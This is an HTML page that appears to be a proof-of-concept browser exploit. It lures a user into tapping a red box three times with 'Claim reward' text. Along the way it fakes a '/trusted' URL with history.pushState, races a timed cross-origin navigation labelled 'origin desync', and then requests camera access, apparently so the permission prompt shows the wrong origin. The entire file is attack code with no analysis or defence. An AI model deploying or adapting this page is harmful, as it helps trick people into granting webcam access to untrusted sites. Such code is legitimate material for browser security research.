<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body {
    margin:0;
    height:100vh;
    background:#111;
    color:#fff;
    overflow:hidden;
    user-select:none;
    font-family:sans-serif;
  }

  #redBox {
    position:absolute;
    top:12px;
    right:20px;
    width:36px;
    height:36px;
    background:red;
    border-radius:6px;
  }

  #counter {
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    font-size:26px;
    text-align:center;
  }

  video {
    position:absolute;
    bottom:20px;
    left:50%;
    transform:translateX(-50%);
    width:240px;
    border-radius:10px;
  }
</style>
</head>

<body>

<div id="redBox"></div>
<div id="counter">Tap the red box 3×</div>
<video id="cam" autoplay playsinline></video>

<script>
let clicks = 0;

const box = document.getElementById("redBox");
const counter = document.getElementById("counter");
const cam = document.getElementById("cam");

box.onclick = async () => {
  clicks++;
  counter.textContent = "x" + clicks;

  // 1️⃣ Fake trust / visual state
  if (clicks === 1) {
    history.pushState({}, "", "/trusted");
    counter.textContent = "Nice! Keep tapping…";
  }

  // 2️⃣ Navigation race (origin desync)
  if (clicks === 2) {
    counter.textContent = "Almost there…";

    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        setTimeout(() => {
          // 🔥 Cross-origin navigation
          location.href = "https://google.com:9090";
        }, 70);
      });
    });
  }

  // 3️⃣ Sensitive API — CAMERA
  if (clicks === 3) {
    counter.textContent = "Claim reward 🎁";

    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
        cam.srcObject = stream;
        counter.textContent = "Camera access granted";
      } catch (e) {
        counter.textContent = "Camera permission denied";
      }
    } else {
      counter.textContent = "Camera API not supported";
    }
  }
};
</script>

</body>
</html>
